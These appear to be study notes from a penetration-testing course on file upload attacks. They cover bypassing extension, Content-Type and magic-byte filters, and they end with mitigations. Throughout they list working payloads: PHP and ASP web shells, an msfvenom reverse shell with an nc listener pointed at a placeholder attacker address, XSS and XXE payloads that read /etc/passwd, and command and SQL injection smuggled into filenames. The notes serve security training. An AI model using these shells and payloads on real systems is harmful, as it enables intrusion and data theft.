# File Upload Attacks

## 🎯 Main Idea
- Exploit insecure file upload functionality in web apps to upload malicious files.
- Primary goal: arbitrary file upload leading to Remote Code Execution (web shell / reverse shell).
- Covers bypassing client-side, blacklist, whitelist, Content-Type, and MIME-type filters.
- Even limited uploads can enable XSS, XXE/SSRF, and DoS attacks.

## 💥 Attack / Exploit Vectors

### Absent Validation (Arbitrary Upload)
- No validation at all — upload a script in the web app's language directly.
- Identify framework first (visit `/index.ext`, Wappalyzer, scanners).
- **Commands**
  - `<?php echo "Hello HTB";?>` — test PHP code execution after upload

### Web Shells
- Upload a script that accepts commands via browser and prints output.
- Must match server language (PHP, ASP, etc.).
- **Commands**
  - `<?php echo file_get_contents('/etc/passwd'); ?>` — basic PHP file read
  - `<?php system('hostname'); ?>` — basic PHP command execution
  - `<?php system($_REQUEST['cmd']); ?>` — basic PHP web shell (use `?cmd=id`)
  - `<% eval request('cmd') %>` — basic ASP/.NET web shell
  - `[CTRL+U]` — view source for clean web shell output in browser

### Reverse Shells
- Upload a script that connects back to attacker listener.
- **Commands**
  - `$ip = 'OUR_IP'; $port = OUR_PORT;` — edit pentestmonkey php-reverse-shell (lines 49-50)
  - `msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php` — generate PHP reverse shell
  - `nc -lvnp OUR_PORT` — start listener

### Client-Side Validation Bypass
- Validation only in front-end JavaScript — fully bypassable.
- **Commands**
  - Modify `filename="HTB.png"` → `shell.php` and file content in Burp request
  - `[CTRL+SHIFT+C]` — toggle Page Inspector to remove `onchange="checkFile(this)"` / `accept` attribute
  - `[CTRL+SHIFT+K]` — Console to inspect the `checkFile` JS validation function

### Blacklist Filter Bypass
- Back-end blocks specific extensions; lists are never comprehensive.
- Fuzz extensions with Burp Intruder + wordlists, sort by Length.
- **Commands**
  - `shell.phtml` — uncommon PHP extension often still executes
  - `shell.pHp` — case manipulation (bypass on case-insensitive Windows)
  - `php, php7, phps, php5, phar, pht` — extensions to try/fuzz

### Whitelist Filter Bypass
- Weak regex checks if name *contains* (not *ends with*) allowed extension.
- **Commands**
  - `shell.jpg.php` — double extension (passes `contains` regex)
  - `shell.php.jpg` — reverse double extension (Apache `<FilesMatch>` misconfig w/o `$`)
  - `shell.php%00.jpg` — null byte injection (PHP ≤ 5.X)
  - `shell.aspx:.jpg` — colon injection on Windows (writes shell.aspx)
  - `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…`, `:` — character injection before/after extension

### Content-Type Header Bypass
- Back-end checks client-supplied `Content-Type` header (manipulable).
- **Commands**
  - Change file's Content-Type header to `image/jpg` in Burp
  - `cat web-all-content-types.txt | grep 'image/' > image-content-types.txt` — build image Content-Type fuzz list

### MIME-Type / Magic Bytes Bypass
- Back-end inspects first bytes (file signature) via `mime_content_type()`.
- **Commands**
  - `GIF8` — prepend GIF magic bytes to shell content to spoof image MIME
  - `echo "GIF8" > text.jpg` then `file text.jpg` — demonstrate MIME change
- Combine mismatched extension / Content-Type / MIME to confuse robust filters.

### Limited Uploads — XSS
- Allowed file types (HTML, SVG, image metadata) can carry Stored XSS.
- **Commands**
  - `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg` — inject XSS into image metadata
  - SVG with `<script>alert(window.origin);</script>` — XSS via SVG XML

### Limited Uploads — XXE / SSRF
- SVG/XML/PDF/DOC carry XML — inject external entities to read files or reach internal services.
- **Commands**
  - `<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><svg>&xxe;</svg>` — leak /etc/passwd
  - `<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">` — read source code (base64)

### Limited Uploads — DoS
- Decompression bomb (nested ZIPs), pixel flood (fake huge JPG/PNG dimensions), oversized files, directory traversal uploads.

### Other Upload Attacks
- Injections in file name → command injection / XSS / SQLi if name is reflected or used in OS command.
- **Commands**
  - `file$(whoami).jpg`, `` file`whoami`.jpg ``, `file.jpg||whoami` — command injection via filename
  - `<script>alert(window.origin);</script>` — XSS via filename
  - `file';select+sleep(5);--.jpg` — SQLi via filename
  - `../../../etc/passwd` — directory traversal upload
- Upload directory disclosure: force errors (duplicate names, overly long names, simultaneous requests).
- Windows-specific: reserved chars `| < > * ?`, reserved names `CON COM1 LPT1 NUL`, 8.3 names `WEB~1.CON` to overwrite files.

## 🛠️ Key Tools & Concepts
- Burp Intruder/Repeater — fuzz extensions, Content-Types, modify upload requests
- Wappalyzer — identify web framework/language
- msfvenom — generate reverse shell payloads
- exiftool — edit image metadata for XSS
- phpbash / pentestmonkey / SecLists — ready-made web & reverse shells
- PayloadsAllTheThings — PHP/ASP extension lists; magic bytes / file signatures

## 🛡️ Mitigations
- Use whitelist AND blacklist; whitelist must anchor with `$` (ends-with).
- Validate extension, Content-Type header, AND MIME/file signature — all must match.
- Apply validation on back-end, not just front-end.
- Hide uploads directory; serve via `download.php` with authz + path validation; return 403 on direct access.
- Randomize stored file names; store sanitized original name in DB.
- Set headers: `Content-Disposition: attachment`, `Content-Type`, `X-Content-Type-Options: nosniff`.
- Store uploads on separate server/container; use PHP `open_basedir`.
- `disable_functions` in php.ini (exec, shell_exec, system, passthru).
- Limit file size, update libraries, scan for malware, use a WAF.
